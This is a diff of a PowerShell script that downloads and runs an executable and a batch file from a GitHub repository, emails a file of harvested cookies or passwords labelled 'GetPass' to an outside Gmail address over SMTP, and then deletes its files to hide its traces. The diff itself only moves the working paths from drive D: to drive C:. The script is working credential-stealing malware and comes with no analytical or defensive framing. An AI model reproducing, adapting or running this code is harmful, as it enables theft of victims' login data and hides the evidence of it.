@@ -1,6 +1,6 @@
-(new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/demo.exe','D:\demo.exe');
-(new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/Command.txt','D:\Command.bat');
-D:
+(new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/demo.exe','C:\demo.exe');
+(new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/Command.txt','C:\Command.bat');
+C:
 .\demo.exe | Out-Null
 $SMTPServer = 'smtp.mailtrap.io'
 
@@ -19,14 +19,14 @@ $ReportEmail.To.Add('jj55521932jj@gmail.com')
 $ReportEmail.Subject = 'GetPass'
 
 $ReportEmail.Body = 'GetPass_text'  
-$ReportEmail.Attachments.Add('D:\coookie.txt')
+$ReportEmail.Attachments.Add('C:\coookie.txt')
 
 
 $SMTPInfo.Timeout = 1000000
 $SMTPInfo.Send($ReportEmail)
 $ReportEmail.Attachments.Dispose()
 
-remove-item 'D:\coookie.txt'
-remove-item 'D:\Command.bat'
-remove-item 'D:\demo.exe'
+remove-item 'C:\coookie.txt'
+remove-item 'C:\Command.bat'
+remove-item 'C:\demo.exe'
 
